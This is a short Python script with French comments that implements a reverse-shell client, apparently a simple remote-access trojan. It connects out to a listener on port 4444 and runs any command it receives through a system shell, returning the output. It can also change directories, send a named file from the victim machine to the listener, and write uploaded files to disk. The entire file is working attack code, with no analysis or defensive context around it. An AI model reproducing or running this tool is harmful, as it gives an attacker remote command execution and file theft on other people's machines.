import socket
import os
import subprocess as sb
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
h="127.0.0.1"
p=4444
e="utf-8"
s.connect((h,p))
print("Client connecté")
while True:
    com=s.recv(1024).decode(e).strip()
    if com == "shell":
        while True:
            recv = s.recv(1024).decode(e)
            if not recv:
                continue
            elif recv == "exit":
                break
            elif recv == "cd":
                cmd = sb.Popen("cd",shell=True,stdout=sb.PIPE,stderr=sb.PIPE)
                out,err = cmd.communicate()
                if cmd.returncode == 0:
                    s.sendall(str(len(out)).encode(e))
                    s.sendall(out)
                else:
                    s.sendall(str(len(err)).encode(e))
                    s.sendall(err)
                
            elif recv[:3] == "cd ":
                # Si la commande est 'cd' suivi d'un répertoire, change de répertoire
            
                os.chdir(recv[3:])
                p=os.getcwd()
                s.sendall(str(len(p)).encode(e))
                s.sendall(p.encode(e))
                
                
            else:
                cmd = sb.Popen(recv,shell=True,stdout=sb.PIPE,stderr=sb.PIPE)
                out,err = cmd.communicate()
                if cmd.returncode == 0:
                    s.sendall(str(len(out)).encode(e))
                    
                    s.sendall(out)
                else:
                    s.sendall(str(len(err)).encode(e))
                    s.sendall(err)

        
    if com == "down":
        name = s.recv(1024).decode(e).strip()
        if not name:
            continue
        size= os.path.getsize(name)
        
        with open(name,"rb") as file:
            c=0
            s.sendall(str(size).encode(e))
            while c < size:
                data=file.read()
                s.sendall(data)
                c+=len(data)
    if com == "upl":
        size = int(s.recv(1024).decode(e).strip())
        if not size:
            continue
        reg=s.recv(1024).decode(e).strip()
        if not reg:
            continue
        
        
        with open(reg,"wb") as file:
            c=0
            while c < size:
                data = s.recv(1024)
                file.write(data)
                c+=len(data)
    
s.close()
